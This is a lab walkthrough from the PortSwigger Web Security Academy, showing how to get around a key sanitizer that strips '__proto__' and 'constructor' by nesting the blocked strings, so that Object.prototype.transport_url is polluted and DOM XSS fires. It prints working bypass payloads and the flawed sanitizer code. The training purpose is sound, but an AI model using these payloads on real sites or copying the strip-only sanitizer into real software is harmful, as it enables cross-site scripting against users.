# Lab : Client-side prototype pollution via flawed sanitization

**Platform:** PortSwigger Web Security Academy

**Category:** Prototype Pollution (PRACTITIONER)

<img width="962" height="232" alt="image" src="https://github.com/user-attachments/assets/1ef7b101-e213-4112-86f2-259294f5c053" />


## Lab Description

This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.

To solve the lab:

- Find a source that you can use to add arbitrary properties to the global Object.prototype.

- Identify a gadget property that allows you to execute arbitrary JavaScript.

- Combine these to call alert().

## Steps

### 1. Finding the Prototype Pollution Source

First, I tested whether I could pollute Object.prototype.

I tried the usual prototype pollution payload:

```text
__proto__[test]=test
```

However, this time the payload did not work because the application sanitizes dangerous property names such as:

```
__proto__
constructor
prototype
```

So I inspected the sanitization function and found:

```js
function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];

    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }

    return key;
}
```

The problem is that the application removes the blocked strings instead of completely rejecting the parameter.

For example, I can use:

```text
__pro__proto__to[test]=test
```

When the sanitizer removes the middle \_\_proto__, the result becomes:

```
__proto__[test]=test
```

This allows the dangerous property to survive the sanitization.

After sending the bypass payload, I confirmed that the test property had been added to Object.prototype.


### 2. Finding the Gadget


As before, The goal was therefore to pollute:

```
transport_url
```


### 3. Bypassing the Sanitization

I used:

```
__pro__proto__to[transport_url]=data:,alert()
```

The sanitizer removes the inner:

```text
__proto__
```

and the remaining string becomes:

```text
__proto__[transport_url]=data:,alert()
```

This allows me to effectively pollute:

```js
Object.prototype.transport_url = "data:,alert()";
```

### 4. Another Sanitization Bypass

The same idea can be applied to the other blocked property names.

For example:

```
construconstructorctor[protoprototypetype][transport_url]=data:,alert()
```

The duplicated strings are designed so that removing one occurrence leaves the dangerous property name behind.

After sanitization, the payload can become effectively:

```
constructor[prototype][transport_url]=data:,alert()
```


### 5. Exploiting the Gadget

Using the first bypass, my final payload was:

```text 
__pro__proto__to[transport_url]=data:,alert()
```

The prototype pollution causes:

```js
Object.prototype.transport_url = "data:,alert()";
```

Then the gadget checks:

```js
config.transport_url
```

Since the property is inherited from Object.prototype, the condition succeeds:

```js 
if(config.transport_url)
```

The application then creates:

```html
<script src="data:,alert()"></script>
```

The browser executes the JavaScript from the 'data:' URL and calls alert()

Voilaaaa!! 

The alert appeared and the lab was solved.

#

**Lab Link:** [Open the lab](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)

See you in the next lab solution, In sha Allah!


سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
